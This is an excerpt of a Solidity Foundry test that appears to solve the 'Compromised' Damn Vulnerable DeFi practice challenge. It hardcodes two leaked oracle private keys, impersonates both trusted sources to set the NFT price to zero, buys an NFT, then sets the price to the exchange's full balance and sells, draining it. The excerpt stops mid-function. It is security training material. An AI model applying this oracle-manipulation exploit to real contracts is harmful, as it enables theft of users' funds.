...
contract Compromised is Test {
    ...
    //=========================== variables of the attacker ==================================
    uint256 privateKeyOne = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
    address trustedSourceOne = vm.addr(privateKeyOne);
    uint256 privateKeyTwo = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
    address trustedSourceTwo = vm.addr(privateKeyTwo);
    string constant SYMBOL = "DVNFT";
    //========================================================================================
    ...
    function _setTokenPrice(uint256 price) internal {
        vm.prank(trustedSourceOne);
        trustfulOracle.postPrice(SYMBOL, price);
        vm.prank(trustedSourceTwo);
        trustfulOracle.postPrice(SYMBOL, price);
    }
    ...
    function testExploit() public {
         ...
         * EXPLOIT START *
         */
        uint256 originalPrice = 999 ether;
        _setTokenPrice(0);
        // Buy an NFT for 0 ether price
        vm.prank(attacker);
        uint256 tokenId = exchange.buyOne{value: 0.05 ether}();
        _setTokenPrice(address(exchange).balance);
        // Approve the transfer of the nft and sell it
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange), tokenId);
        exchange.sellOne(tokenId);
        vm.stopPrank();
        _setTokenPrice(originalPrice);
